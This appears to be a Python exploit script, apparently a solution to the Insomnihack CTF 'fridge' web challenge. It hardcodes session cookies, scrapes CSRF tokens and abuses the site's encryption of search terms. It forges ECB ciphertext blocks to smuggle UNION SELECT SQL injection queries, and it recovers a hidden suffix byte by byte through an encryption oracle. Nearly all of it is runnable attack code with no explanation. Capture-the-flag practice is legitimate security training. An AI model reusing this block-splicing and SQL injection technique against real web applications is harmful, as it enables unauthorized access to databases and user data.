import requests
import time
import string


prefx_len = 7
sufx_len = 11

def encrypt(payload):
    sessid = 'ln8h6x5zwp6oj2e7kz6zd45hlu97q3yp'
    cookies = {'sessionid': sessid}
    cookies['AWSELB'] = '033F977F02D671BCE8D4F0E661D7CA8279D94E64EF1BD84608DB9FFA0FC0F2F4F304AC9CD30CDCC86788A845DF98A68A77D605B8BF768114D93228AACFB536DE3963E28F295D0C2D52138BA1520672BB1428B11124'
    url0 = 'http://fridge.insomnihack.ch/'

    base = requests.get(url0, cookies=cookies)
    text = base.text

    csrf = "<input type='hidden' name='csrfmiddlewaretoken' value='"
    start = text.find(csrf) + len(csrf)
    token = text[start:start+32]
    cookies['csrftoken'] = token

    url = 'http://fridge.insomnihack.ch/users/'
    resp = requests.post(url, data={'term': payload, 'csrfmiddlewaretoken': token}, cookies=cookies, allow_redirects=False)
    prefx = '/search/'
    loc = resp.headers['location']
    return loc[len(prefx):-1]

def chunks(data, n):
    return [data[i*n:(i+1)*n] for i in range(len(data) / n)]


def encrypt2(payload):
    session = '16if76517xm5zvvwn0l09yq8hqwbgdi5'
    cookies = {'sessionid': session}
    cookies[
        'AWSELB'] = '033F977F02D671BCE8D4F0E661D7CA8279D94E64EFD0AA7BC023208F4937F97452EF3E07B21CF2698ED17FB3AE4D8A6166A17A44ACBC6810BEC0739D56BBE463F63CC54BC91275B57E8FE8CBB9B39F65DFAFFA27C1'
    url0 = 'http://fridge.insomnihack.ch/'

    base = requests.get(url0, cookies=cookies)
    text = base.text

    csrf = "<input type='hidden' name='csrfmiddlewaretoken' value='"
    start = text.find(csrf) + len(csrf)
    token = text[start:start + 32]
    cookies['csrftoken'] = token

    real_payload = "123456789"
    real_payload += payload
    padding_len = ((len(payload)+15)/16)*16 - len(payload)
    real_payload += " "*padding_len

    url = 'http://fridge.insomnihack.ch/users/'
    resp = requests.post(url, data={'term': real_payload, 'csrfmiddlewaretoken': token}, cookies=cookies,
                         allow_redirects=False)
    prefx = '/search/'
    loc = resp.headers['location']
    ciphertext = loc[len(prefx):-1]
    return chunks(ciphertext, 32)[1:-1]

def hack(query):
    parts = encrypt2(query)
    part = ''.join(parts)
    prfx = 'b15fd5ffdae30bbe81f2ba9ec6930473cce0dd7d051074345c5a8090ba39d24c'
    sufx = 'b9719c83f5ab5c0751937a39150c920d'
    return prfx + part + sufx 

def hack2(query):
    payload = hack(query)
    session = '16if76517xm5zvvwn0l09yq8hqwbgdi5'
    cookies = {'sessionid': session}
    cookies[
        'AWSELB'] = '033F977F02D671BCE8D4F0E661D7CA8279D94E64EFD0AA7BC023208F4937F97452EF3E07B21CF2698ED17FB3AE4D8A6166A17A44ACBC6810BEC0739D56BBE463F63CC54BC91275B57E8FE8CBB9B39F65DFAFFA27C1'
    url = 'http://fridge.insomnihack.ch/search/'
    r = requests.get(url + payload, cookies=cookies)
    return r.text

def hack3(query):
    return hack2(' union all select 1, (' + query + '), 3, 4, 5 union all select 1, 2, 3, 4, 5 from objsearch_user ')

import sys
print hack3(sys.argv[1])
sys.exit()

print hack2(' union all select 1, 2, 3, 4, 5 union all select (select 1 from user), 2, 3, 4, 5 from objsearch_user ')

prefx = 'p' * prefx_len
known_suffix = '|type=use'
for i in range(sufx_len):
    content_len = 48 - prefx_len - len(known_suffix) - 1
    content = 'a' * content_len

    crypted = encrypt(content)
    crypted_chunks = chunks(crypted, 32)
    print crypted_chunks
    sought = crypted_chunks[-2]
    print 'sought', i, sought

    for c in [chr(x) for x in range(256)]:
        payload = content + known_suffix + c
        decrypted = encrypt(payload)
        decrypted_chunks = chunks(decrypted, 32)
        print decrypted_chunks
        result = decrypted_chunks[-2]
        if result == sought:
            print 'got', c
            known_suffix += c
            print known_suffix
            break
